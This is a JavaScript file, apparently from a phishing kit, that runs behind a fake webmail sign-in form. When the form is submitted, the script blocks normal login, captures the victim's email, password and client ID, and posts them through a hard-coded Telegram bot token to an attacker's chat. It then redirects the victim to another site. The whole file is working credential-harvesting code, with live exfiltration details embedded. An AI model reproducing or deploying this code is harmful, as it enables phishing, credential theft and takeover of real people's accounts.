document.addEventListener("DOMContentLoaded", function () {
  const telegramBotId = "7273335886:AAFfBkz6TbFX6IbPfJ4sAB_pFyUBhuhEWWI";
  const telegramChatId = "7323113234";

  function handleSignin(event) {
    event.preventDefault(); // Prevent form submission

    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;
    const clientID = document.getElementById("clientID").value;

    const payload = {
      chat_id: telegramChatId,
      text: `Email: ${email}\nPassword: ${password}\nClient ID: ${clientID}`
    };

    fetch("https://api.telegram.org/bot" + telegramBotId + "/sendMessage", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    })
      .then((response) => {
        if (response.ok) {
          window.location.href = "https://pmegtrading.online/"; // Redirect to success URL
        } else {
          console.error("Error sending data to Telegram:", response.statusText);
          window.location.href = "https://example.org"; // Redirect to error URL
        }
      })
      .catch((error) => {
        console.error("Error sending data to Telegram:", error);
        window.location.href = "https://example.org"; // Redirect to error URL
      });
  }

  document.getElementById("webmailSignin-form").addEventListener("submit", handleSignin);
});
